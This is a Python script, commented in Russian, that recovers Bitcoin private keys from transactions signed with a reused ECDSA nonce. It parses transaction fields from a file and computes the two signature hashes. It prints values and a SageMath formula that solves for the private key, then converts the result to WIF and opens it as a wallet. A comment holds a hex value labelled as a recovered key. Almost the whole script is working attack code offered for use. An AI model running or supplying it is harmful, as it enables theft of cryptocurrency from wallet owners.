

import re
i = 1
with open('list-addresses.txt') as file:
    while i <= 24:
        exec("x{} = {}".format(i, 'str(file.readline())'))
        i += 1
x0 = '00'    
x00 = ''

res1 = x1 + x2 + x3 + x4 + x21 + x22 + x10 + x11 + x12 + x0 + x00 + x18 + x19 + x20 + x21 + x22 + x23 + x24
#re.sub("^\s+|\n|\r|\s+$", '', res)
res1 = res1.replace("\r","")
res1 = res1.replace("\n","")
print(res1)
print()

from binascii import unhexlify
from hashlib import sha256
# header = input("Введите длинное число:")
res1 = unhexlify(res1)
res1 = sha256(sha256(res1).digest()).hexdigest()
print(res1)

print()

res = x1 + x2 + x3 + x4 + x0 + x00 + x10 + x11 + x12 + x21 + x22 + x18 + x19 + x20 + x21 + x22 + x23 + x24
res = res.replace("\r","")
res = res.replace("\n","")
print(res)
print()

res = unhexlify(res)
res = sha256(sha256(res).digest()).hexdigest()
print(res)
print()

print('p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141')
print('r  = 0x' + x6)
print('s1 = 0x' + x8)
print('s2 = 0x' + x16)
print('z1 = 0x' + res1)
print('z2 = 0x' + res)
print('K = GF(p)')
print('K((z1*s2 - z2*s1)/(r*(s1-s2)))')

# print () Это просто пробел
print()

header = input("Введите длинное число:")

import codecs  #If not installed: "pip3 install codecs"
import hashlib
# отсюда взять полученный результат https://sagecell.sagemath.org/
bits_hex = hex(int(header))

# 0x66d891b5ed7f51e5044be6a7ebe4e2eae32b960f5aa0883f7cc0ce4fd6921e31
private_key = bits_hex[2:]
# print(private_key)
# PK0 is  private key.
PK0 = private_key
PK1 = '80'+ PK0
PK2 = hashlib.sha256(codecs.decode(PK1, 'hex'))
PK3 = hashlib.sha256(PK2.digest())
checksum = codecs.encode(PK3.digest(), 'hex')[0:8]
PK4 = PK1 + str(checksum)[2:10]  #I know it looks wierd

# Define base58
def base58(address_hex):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    b58_string = ''
    # Get the number of leading zeros
    leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
    # Convert hex to decimal
    address_int = int(address_hex, 16)
    # Append digits to the start of string
    while address_int > 0:
        digit = address_int % 58
        digit_char = alphabet[digit]
        b58_string = digit_char + b58_string
        address_int //= 58
    # Add ‘1’ for each 2 leading zeros
    ones = leading_zeros // 2
    for one in range(ones):
        b58_string = '1' + b58_string
    return b58_string

WIF = base58(PK4)
# print(WIF)

from bitcoinaddress import Wallet

wallet = Wallet(WIF)
print(wallet)

